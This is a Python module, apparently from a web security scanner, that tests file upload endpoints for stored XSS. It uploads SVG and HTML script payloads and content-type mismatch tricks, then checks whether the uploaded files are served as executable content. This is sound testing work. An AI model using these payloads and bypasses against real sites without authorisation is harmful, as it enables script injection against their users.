"""File upload XSS — SVG, HTML, and metadata-based XSS via file upload endpoints."""

from __future__ import annotations

import re
from dataclasses import dataclass
from pathlib import Path

import httpx


# SVG payloads (rendered directly by browser as HTML when served with image/svg+xml or text/html)
SVG_PAYLOADS = {
    "svg_script": b"""\
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>""",

    "svg_onload": b"""\
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle cx="50" cy="50" r="40"/>
</svg>""",

}

# HTML file XSS (when server allows .html/.htm uploads or serves with text/html)
HTML_PAYLOADS = {
    "html_basic": b"<script>alert(document.domain)</script>",
    "html_full": b"""\
<!DOCTYPE html>
<html>
<head><title>XSS</title></head>
<body onload="alert(document.domain)">
<h1>XSS</h1>
</body>
</html>""",
}

# Content-Type bypass tricks — mismatch to trigger browser sniffing
CONTENT_TYPE_TRICKS = [
    ("image/png", "xss.svg"),           # CT mismatch — browser may sniff
    ("text/html", "xss.svg"),
    ("image/jpeg", "xss.html"),         # renamed extension
]


@dataclass
class FileUploadFinding:
    type: str = "file_upload_xss"
    upload_url: str = ""
    served_url: str = ""
    filename: str = ""
    content_type: str = ""
    technique: str = ""
    served_content_type: str = ""
    xss_triggered: bool = False
    evidence: str = ""
    severity: str = "P1"


class FileUploadXSS:
    """Tests file upload endpoints for XSS via SVG, HTML, and content-type tricks."""

    def __init__(self, session: httpx.Client | None = None):
        self.session = session or httpx.Client(timeout=30, follow_redirects=True)

    def scan(self, upload_url: str, file_param: str = "file",
             extra_fields: dict | None = None) -> list[FileUploadFinding]:
        findings: list[FileUploadFinding] = []
        extra_fields = extra_fields or {}

        for technique, content in SVG_PAYLOADS.items():
            f = self._upload_and_check(
                upload_url, file_param, extra_fields,
                filename="test.svg", content=content,
                content_type="image/svg+xml", technique=technique,
            )
            if f:
                findings.append(f)

        for technique, content in HTML_PAYLOADS.items():
            f = self._upload_and_check(
                upload_url, file_param, extra_fields,
                filename="test.html", content=content,
                content_type="text/html", technique=technique,
            )
            if f:
                findings.append(f)

        # Content-type confusion test with SVG
        for ct, filename in CONTENT_TYPE_TRICKS:
            f = self._upload_and_check(
                upload_url, file_param, extra_fields,
                filename=filename, content=SVG_PAYLOADS["svg_script"],
                content_type=ct, technique=f"ct_confusion_{ct.replace('/', '_')}",
            )
            if f:
                findings.append(f)

        return findings

    def check_served_url(self, url: str) -> tuple[bool, str]:
        """Check if an uploaded file URL serves XSS-triggerable content."""
        try:
            resp = self.session.get(url)
        except Exception:
            return False, ""
        ct = resp.headers.get("content-type", "")
        body = resp.text
        dangerous_ct = any(t in ct for t in ["text/html", "image/svg", "application/xml"])
        has_xss_marker = any(t in body for t in ["<script", "onerror", "onload", "javascript:"])
        return dangerous_ct and has_xss_marker, ct

    def _upload_and_check(
        self, upload_url: str, file_param: str, extra_fields: dict,
        filename: str, content: bytes, content_type: str, technique: str,
    ) -> FileUploadFinding | None:
        files = {file_param: (filename, content, content_type)}
        try:
            resp = self.session.post(upload_url, files=files, data=extra_fields)
        except Exception:
            return None
        if resp.status_code >= 400:
            return None
        served_url = self._extract_served_url(resp.text, resp.headers)
        if not served_url:
            return None
        triggered, served_ct = self.check_served_url(served_url)
        if triggered:
            return FileUploadFinding(
                upload_url=upload_url, served_url=served_url,
                filename=filename, content_type=content_type,
                technique=technique, served_content_type=served_ct,
                xss_triggered=True, evidence=resp.text[:200],
            )
        return None

    def _extract_served_url(self, body: str, headers) -> str:
        m = re.search(r'"(https?://[^"]+\.(svg|html|xml|htm))"', body)
        if m:
            return m.group(1)
        loc = headers.get("location", "")
        return loc if loc else ""
